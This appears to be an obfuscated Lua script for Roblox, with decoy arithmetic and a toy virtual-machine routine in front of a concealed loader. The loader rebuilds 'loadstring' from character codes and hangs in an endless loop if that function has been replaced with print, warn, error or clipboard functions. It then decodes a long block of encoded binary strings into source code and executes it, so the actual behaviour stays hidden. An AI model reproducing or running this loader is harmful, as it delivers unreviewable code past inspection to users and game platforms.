local function a(b) return b + 2 end local function c(d) return d * 2 end local function e(f, g) return f - g end local function h(i, j) return i / j end local function k(l) return l ^ 2 end local function m(n) return n % 3 end local p = 5 local q = a(p) local r = c(q) local s = e(r, p) local t = h(s, p) local u = k(t) local v = m(u) local x = 10 local y = a(x) local z = e(y, 4) local w = c(z) local j1 = h(w, 3) local k1 = m(j1) local function l1() return p * q end local function l2() return e(r, s) end local function l3() return t + u end local function l4() return v - w end local z1 = l1() local z2 = l2() local z3 = l3() local z4 = l4() local t1 = a(z1) local t2 = c(z2) local t3 = e(z3, z4) local t4 = h(t1, t2) local t5 = m(t3) local function n1(x) return x * 4 end local function n2(y) return y + 5 end local function n3(z) return z - 10 end local result1 = n1(t5) local result2 = n2(result1) local result3 = n3(result2) local temp = result3 + 100 local final = temp / 10 local vm = {} vm.registers = {A = 0, B = 0, C = 0, D = 0} vm.memory = {} vm.stack = {} vm.pc = 1 vm.code = {} local function op_add(r1, r2) return r1 + r2 end local function op_sub(r1, r2) return r1 - r2 end local function op_mul(r1, r2) return r1 * r2 end local function op_div(r1, r2) if r2 == 0 then return 0 else return r1 / r2 end end local function dummy1(a, b) local c = a + b local d = a * b local e = c - d local f = h(c, b + 1) return f + d end local function dummy2(x) local y = x * 2 local z = x - y return z + a(x) end local instr_set = {} instr_set["ADD"] = function(reg, val) vm.registers[reg] = vm.registers[reg] + val end instr_set["SUB"] = function(reg, val) vm.registers[reg] = vm.registers[reg] - val end instr_set["MUL"] = function(reg, val) vm.registers[reg] = vm.registers[reg] * val end instr_set["DIV"] = function(reg, val) vm.registers[reg] = vm.registers[reg] / val end local program = { {"ADD", "A", 5}, {"MUL", "B", 3}, {"SUB", "C", 2}, {"DIV", "D", 4}, {"ADD", "A", 7}, {"MUL", "C", 2}, {"SUB", "B", 1}, {"DIV", "A", 2}, {"ADD", "D", 10}, {"SUB", "C", 3}, {"MUL", "B", 4}, {"DIV", "D", 2} } local function load_program(prog) for i = 1, #prog do vm.code[i] = prog[i] end end local function execute_program() for i = 1, #vm.code do local inst = vm.code[i] local op = inst[1] local reg = inst[2] local val = inst[3] if instr_set[op] then instr_set[op](reg, val) end end end local function vm_initialization() vm.registers.A = final vm.registers.B = p + x vm.registers.C = z1 vm.registers.D = t4 for i = 1, 50 do vm.stack[i] = (i * 3) % 7 end for i = 1, 100 do vm.memory[i] = i % 5 end end local function vm_loop() local count = 0 while count < 100 do vm.pc = vm.pc + 1 vm.registers.A = op_add(vm.registers.A, dummy1(count, vm.pc)) vm.registers.B = op_sub(vm.registers.B, dummy2(count)) vm.registers.C = op_mul(vm.registers.C, 1.001) vm.registers.D = op_div(vm.registers.D, 1.002) count = count + 1 end end local function auxiliary() local arr = {} for i = 1, 30 do arr[i] = i * a(i) - c(i) end local sum = 0 for i = 1, #arr do sum = sum + arr[i] end local prod = 1 for i = 1, #arr do prod = op_mul(prod, (arr[i] % 5 + 1)) end local mix = dummy1(sum, prod) for i = 1, 20 do mix = op_add(mix, dummy2(i)) end vm.registers.A = vm.registers.A + mix end vm_initialization() load_program(program) execute_program() vm_loop() auxiliary() local q_xxfl__ = {e_nnn_ll = {q_xIf_xx = table.concat},l______q = {fvq___f_ = loadstring},_______p = {_fxe__qn = tonumber},xpx__flx = {_nx__zql = string.char},_z_q_ppx = { ____e_q_ = setmetatable}, ____lepv = { _lxq___I = nil} } local n____q__ = q_xxfl__.e_nnn_ll.q_xIf_xx local _lnf____ = q_xxfl__.l______q.fvq___f_ local ell__vf_ = q_xxfl__._______p._fxe__qn local ___Il_z_ = q_xxfl__.xpx__flx._nx__zql local x___f___ = q_xxfl__._z_q_ppx.____e_q_ local __eIxe_l = q_xxfl__.____lepv._lxq___I local _I______ = ___Il_z_(108, 111, 97, 100, 115, 116, 114, 105, 110, 103) function vnp___n_(__z_p_e_) local luacrypt_so_tuff = "ts pmo icl dnt pmo wrd2foenem" local e__x_l_l = __z_p_e_ local n_nn_nf_ = setclipboard local _x__v___ = toclipboard local function _pe____x(___f__I_) return function() return ___f__I_ end end local n_x_Illz = warn local function p_p__n__(__xxfe_f) return _pe____x(__xxfe_f)() end local __p_q___ = error local function e_pe__zx() while true do end end local ___xx___ = print local function pf_x__e_() return p_p__n__(math.random(100, 999)) end local ep_x____ = game local x_e__x_v = {_lnf____,ep_x____,___xx___,n_x_Illz,__p_q___,n_nn_nf_,_x__v___} if x_e__x_v[1] == x_e__x_v[3] or x_e__x_v[1] == x_e__x_v[4] or x_e__x_v[1] == x_e__x_v[5] or x_e__x_v[1] == x_e__x_v[6] or x_e__x_v[1] == x_e__x_v[7] then e_pe__zx() end local function en___q_q(_vx___v_) local function _q__z___(_f_Iq__e) return ___Il_z_(ell__vf_(_f_Iq__e, 2)) end pf_x__e_() local p___xxxf = _vx___v_:gsub("[^01]", "") return p___xxxf:gsub("(".. ("[01]"):rep(8) .. ")", _q__z___) end local l_vn__z_ = en___q_q(e__x_l_l) local sporty = game:GetService("Workspace") local function __zpzpzI(nxxz___v) local xvxI_v__, __q__e__, v_____n_, __q__nIx = "l", "o", "a", "d" local z__I____, _____Ilx, _exfxlf_, ___vz__f = "s", "t", "r", "i" local ____I_l_, xv__p_nl = "n", "g" local function _Iv___l_(...) local z_I__pI_, __ezI_pl = {...}, "" for i = 1, #z_I__pI_ do __ezI_pl = __ezI_pl .. z_I__pI_[i] end return __ezI_pl end local v__xpexe = _Iv___l_(xvxI_v__, __q__e__, v_____n_, __q__nIx, z__I____, _____Ilx, _exfxlf_, ___vz__f, ____I_l_, xv__p_nl) local l__Iqvex = ("%s"):format(v__xpexe) local _vI_qpzl, v__nq___ = pcall(_lnf____(nxxz___v)) local __qq_Ipx, _fee_xlf, fpp___zq = "F__FF_W__DW_VW_S__XSGS_FQ_F__G_WXVDRSZF_S_R____FVR", "_W_FWZ___Z_GW_RQV__VG_QFF_V_GXS__FS_R___S_WS_X_FGS", "__F___V__Z__XWVRFWFSD___ZF_QG_RQ___RSF__QS____W___" local __n___f_ = (2 * 5 / 10 + 3 - 3) ^ 1 if not _vI_qpzl then local ____vv_x = { __qq_Ipx, _fee_xlf, fpp___zq, __n___f_ } for i = 1, # ____vv_x do ____vv_x[i] = ____vv_x[i] .. "_extra" end end return v__nq___ end __zpzpzI(l_vn__z_, q_xxfl__.____lepv._lxq___I); pf_x__e_() local _l___pe_ = x___f___( { _e_l_npz = { qf_xz__x = { x_x__I_q, _z_e_p__, q___xnxp }, ne__vnpv = function() for q__fpqv_ = 1, 50 do local e__Inf__ = q__fpqv_ * 2 local pqxzxxxp = {q__fpqv_, q__fpqv_ * 10, q__fpqv_ * 100} end return q_xxfl__.____lepv._lxq___I end }, xveI_lex = { [true] = { function() for _ppqf_lf = 1, 100 do local _n_f_f_f = _ppqf_lf * _ppqf_lf if _n_f_f_f > 100 then break end end end }, [false] = { { function() return false end }, function() for __z_____ = 1, 10 do local _ep_xz__ = __z_____ * 2 end end } } }, { __index = function(_, x__n_v_q) local nnI__pv_ = "Lua Crypt1" if x__n_v_q == "print" then for penx____ = 1, 100 do local pIqe_vv_ = penx____ * penx____ + penx____ end return print elseif x__n_v_q == "warn" then for __pIfzxq = 1, 50 do local ___pef_q = __pIfzxq * 3 if ___pef_q == 150 then return warn end end end return q_xxfl__.____lepv._lxq___I end } ) end vnp___n_(n____q__({'047274176343164943025296134569176736026353055653','055574134366194643075237177477134525157996136667','066796132434157734093363099469092727092674136656','074735172537123459066624036273127244024972097375','043723124526192345154224039433075976132692145449','027279177692156436174996055737136234044295036624','034934142547147223167237075292092354125662073236','036932173779193794025945127692027942036536132234','026793163365139429023336166473152343123769073453','022994129469193432039242046627124747163729193723','039594069269149664067475137422044973044459037993','046266197642129999065964044569192925153925123257','026434146222174295063994066527044795073559129263','036642194422157554077326154246127362039375136272','099736173925165996033935043975142495032927144335','073599033379139563147726137995064959157994054349','022957176599053324057976134542093379059269034393','023525137599157557163745065436167462075939094596','076466155492172525146677053522159646022499097444','095262157579124933143662073557074679022259097266','033997159637027764039255022234164477176927196423','093295124244177256044529049924176762023394133247','076523143527173242132372096725176947045262067555','076324044969192293047952163456034922027574069297','023556052436155664025749049346162939155742192755','025646159532136393043264145425034535029679053472','046472132275125795167747073933172767064326046524','052467122977164529157557095772145676099466077952','026599137545164662136664035637064446032495064767','042449122564173464137626054452026436175356144694','075552065222156623192559179397032674132622035779','025749059995152769043356129527132964139769152773','079236043543194765022359193367193777176273135462','059437165923133557147345067495045394037467073676','039399135329194776026544032642062497039943165655','065494154949166323164355092325052566199992144696','059424143725192465127677093573132964029297036924','035462129947156362099732039546196527092565156344','095257145397197629075236036924033733143523069663','055474174977149229049597139935029775075224136723','047497167525195925057444123327134756163354072759','044722067567174552045963179673165955137357046356','066796122696165646073772054692049499167764133972','079546123952134772062235145636146247156943145473','069437153692163263075473157273146364077452129744','029957034795155367095247175299142993162566145376','033354173472144434143744044953072277125947072329','067279172323149364055323092752099939096354149642','065726144554154373146655053773156999129399143255','069345034944173657069734196743147475192432159329','044662199265036342036397075476154639092632025293','076944126722195437049559127355022792165292147535','077526156356053625195425064337164369027377179647','077929195656176945064443045927049936192655175263','042697096549136796193237192335096579042424177245','099393144663175996193233037599035267142437144549','099692174754149665034745026357055536025567167466','042266173779052332144595124664037594046295152979','044699049923166625027442094553159747137396162522','034226042242192943057434173366045345096576144652','095664075259129396099793134964029475062739133969','096932025255127937037273133524049926036523022252','025946069542195694056676164376069535074545132279'}))
